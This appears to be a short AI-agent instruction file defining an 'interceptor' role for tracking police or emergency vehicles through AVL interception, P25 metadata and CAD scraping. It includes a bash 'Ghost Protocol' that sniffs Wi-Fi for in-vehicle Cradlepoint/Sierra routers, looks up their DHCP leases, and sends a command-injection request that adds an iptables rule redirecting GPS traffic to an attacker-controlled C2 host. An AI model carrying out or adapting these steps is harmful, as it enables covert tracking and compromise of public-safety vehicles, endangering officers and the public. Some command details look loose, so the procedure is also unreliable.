# Agent: interceptor
**Role:** Interdiction & Asset Tracking Lead - AVL Interception, P25 Metadata, and CAD Scraping
**Full Technical Instructions:** Refer to the Master Registry at C:\Users\eckel\OneDrive\Documents\Invincible.Inc\.instructions\master_registry.md

## Tactical Implementation: The "Ghost Protocol"
```bash
# Interceptor — Direct Vehicle Target (The Hard Way)
# Step 1: ID Grab (MAC address capture)
# Wi-Fi Sniffing for Cradlepoint/Sierra OUI
airodump-ng -i wlan0mon --output-format pcap --write car_scan

# Step 2: Network Pivot (Identify Active Lease on Private APN)
# Targeted lookup via cell tower "Guest Shell" pivot (Salt Typhoon Method)
grep -i "Cradlepoint" /var/log/dhcp_leases.log

# Step 3: Exploit (CCOS/NCOS Command Injection)
# Breaking the VPN tunnel to force GPS pings to the Interceptor C2
curl -X POST http://[CAR_INTERNAL_IP]/api/v1/shell \
     -d '{"cmd": "iptables -t nat -A PREROUTING -p udp --dport 5050 -j DNAT --to-destination [INTERCEPTOR_IP]"}'
```
